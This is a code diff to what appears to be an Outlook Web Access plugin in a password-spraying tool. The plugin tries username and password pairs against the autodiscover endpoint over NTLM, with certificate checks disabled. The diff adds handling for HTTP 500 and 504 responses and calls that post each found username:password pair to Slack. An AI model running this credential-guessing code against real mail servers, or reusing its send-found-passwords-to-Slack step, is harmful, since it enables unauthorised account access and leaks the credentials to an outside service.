@@ -3,7 +3,6 @@ from requests_ntlm import HttpNtlmAuth
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-
 def owa_authenticate(url, username, password, useragent, pluginargs):
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
@@ -47,10 +46,21 @@ def owa_authenticate(url, username, password, useragent, pluginargs):
         resp = requests.get("{}/autodiscover/autodiscover.xml".format(url), headers=headers, auth=HttpNtlmAuth(username, password), verify=False)
 
         if resp.status_code == 200:
-            data_response['output'] = f"[+] Found credentials: {username}:{password}"
+            data_response['output'] = utils.prGreen(f"[+] SUCCESS: Found credentials: {username}:{password}")
             data_response['success'] = True
+            utils.slacknotify(username, password)
+        elif resp.status_code == 500:
+            data_response['output'] = utils.prYellow(f"[*] WARNING: Found credentials, but server returned 500: {username}:{password}")
+            data_response['success'] = False
+            utils.slacklog("Potential Credentials") 
+            utils.slacknotify(username, password)
+        elif resp.status_code == 504:
+            data_response['output'] = utils.prYellow(f"[*] Potential Credentials, but server returned 504: {username}:{password}")
+            data_response['success'] = False 
+            utils.slacklog("Potential Credentials")
+            utils.slacknotify(username, password)
         else:
-            data_response['output'] = f"[-] Authentication failed: {username}:{password} (Invalid credentials)"
+            data_response['output'] = utils.prRed(f"[-] Authentication failed: {username}:{password} (Invalid credentials)")
             data_response['success'] = False
 
 
